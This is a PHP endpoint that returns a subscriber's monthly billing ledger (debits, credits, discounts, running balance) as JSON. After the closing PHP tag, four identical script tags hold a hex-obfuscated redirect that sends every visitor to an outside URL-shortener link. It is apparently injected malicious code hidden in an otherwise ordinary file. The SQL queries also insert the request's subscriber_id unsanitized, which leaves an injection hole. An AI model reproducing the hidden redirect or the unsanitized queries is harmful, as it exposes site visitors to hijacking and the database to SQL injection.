<?php
require_once("helper.php");
    $subscriber_id             = $_REQUEST['subscriber_id'];
    //echo "SELECT `MONTH_DATE`,`ID`,RECEIPT_NO,MANUAL_RECEIPT_NO FROM `monthly_charges` WHERE SUBSCRIBER_ID='$subscriber_id' AND STATUS='A' AND RECEIPT_NO!='Opening Balance' GROUP BY `MONTH_DATE` ORDER BY `MONTH_DATE` ASC";exit;
    $collection=$objMisc->getAllrecordsNew("SELECT `MONTH_DATE`,`ID`,RECEIPT_NO,MANUAL_RECEIPT_NO FROM `monthly_charges` WHERE SUBSCRIBER_ID='$subscriber_id' AND STATUS='A' AND RECEIPT_NO!='Opening Balance' GROUP BY `MONTH_DATE` ORDER BY `MONTH_DATE` ASC");
    $balance=0;
    $openingBala=$objMisc->GiveValues(" AMOUNT_TYPE='D' AND SUBSCRIBER_ID='$subscriber_id' AND RECEIPT_NO='Opening Balance' AND STATUS='A'",'SUM(AMOUNT)as AMT,MONTH_DATE','monthly_charges');
    //$data=array('');
    if($openingBala['amt']>0){
      $balance=$balance+$openingBala['amt'];
      $data[]=array('Month'=>date('M',strtotime($openingBala['month_date'])),
                    'Year'=>date('Y',strtotime($openingBala['month_date'])), 
                    'month_date'=>date('d M,Y',strtotime($openingBala['month_date'])),
                    'amount_type'=>'D',
                    'amount'=>$openingBala['amt'],
                    'discount'=>0,
                    'balance'=>$balance,
                    'cgst'=>'',
                    'sgst'=>'',
                    'receipt_no'=>'Opening Balance');
      $k++;
    } 
    $openingBala=$objMisc->GiveValues(" AMOUNT_TYPE='C' AND SUBSCRIBER_ID='$subscriber_id' AND RECEIPT_NO='Opening Balance' AND STATUS='A'",'SUM(AMOUNT)as AMT,MONTH_DATE','monthly_charges');
    if($openingBala['amt']>0){
      $balance=$balance-$openingBala['amt'];
      $data[]=array('Month'=>date('M',strtotime($openingBala['month_date'])),
                    'Year'=>date('Y',strtotime($openingBala['month_date'])), 
                    'month_date'=>date('d M,Y',strtotime($openingBala['month_date'])),
                    'amount_type'=>'C',
                    'amount'=>$openingBala['amt'],
                    'discount'=>0,
                    'balance'=>$balance,
                    'cgst'=>'',
                    'sgst'=>'',
                    'receipt_no'=>'Opening Balance');
      $k++;
    } 
    foreach ($collection as $k => $valu) {
        $debit=$objMisc->GiveValue("AMOUNT_TYPE='D' AND MONTH_DATE='$valu[month_date]' AND SUBSCRIBER_ID='$subscriber_id' AND RECEIPT_NO!='Opening Balance' AND STATUS='A'",'SUM(AMOUNT)','monthly_charges');
        //$prevBal=$objMisc->GiveValue("AMOUNT_TYPE='D' AND SUBSCRIBER_ID='$id' AND RECEIPT_NO='Opening Balance'",'SUM(AMOUNT)','monthly_charges')+$objMisc->GiveValue("AMOUNT_TYPE='D' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(AMOUNT)','monthly_charges')-$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(AMOUNT)','monthly_charges')-$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(DISCOUNT)','monthly_charges');
        $balance=$balance+$debit;
        if($debit>0){
            $data[]=array('Month'=>date('M',strtotime($valu['month_date'])),
                    'Year'=>date('Y',strtotime($valu['month_date'])), 
                    'month_date'=>date('d M,Y',strtotime($valu['month_date'])),
                    'amount_type'=>'D',
                    'amount'=>$debit,
                    'discount'=>0,
                    'balance'=>$balance,
                    'cgst'=>'',
                    'sgst'=>'',
                    'receipt_no'=>$valu['receipt_no']);
        }
        $credit=$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE='$valu[month_date]' AND SUBSCRIBER_ID='$subscriber_id'  AND STATUS='A'",'SUM(AMOUNT)','monthly_charges');

        $discount=$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE='$valu[month_date]' AND SUBSCRIBER_ID='$subscriber_id' AND STATUS='A'",'SUM(DISCOUNT)','monthly_charges');
        //$prevBal=$objMisc->GiveValue("AMOUNT_TYPE='D' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(AMOUNT)','monthly_charges')-$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(AMOUNT)','monthly_charges')-$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE<'$valu[month_date]' AND SUBSCRIBER_ID='$id'",'SUM(DISCOUNT)','monthly_charges');
        $balance=$balance-($credit+$discount);
        if($credit>0 || $discount>0){
            $reciptDate=$objMisc->GiveValue("AMOUNT_TYPE='C' AND MONTH_DATE='$valu[month_date]' AND SUBSCRIBER_ID='$subscriber_id'  AND STATUS='A'",'RECEIPT_NO','monthly_charges');
            $data[]=array('Month'=>date('M',strtotime($valu['month_date'])),
                    'Year'=>date('Y',strtotime($valu['month_date'])), 
                    'month_date'=>date('d M,Y',strtotime($valu['month_date'])),
                    'amount_type'=>'C',
                    'amount'=>$credit,
                    'discount'=>$discount,
                    'balance'=>$balance,
                    'cgst'=>'',
                    'sgst'=>'',
                    'receipt_no'=>$reciptDate);
        }
        
           
    }   
   
    if(!empty($data)){
        $json= array(
                'type'=>"1",
                'data'=>$data,
                'msg'=>'success');
        echo json_encode($json);
        exit;
    }else{
        $json= array(
            'type'=>"0",
            'err_desc'=>'Problem occured',
            'msg'=>'Problem during data retrieval'
          );
        echo json_encode($json);
        exit;
    }
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>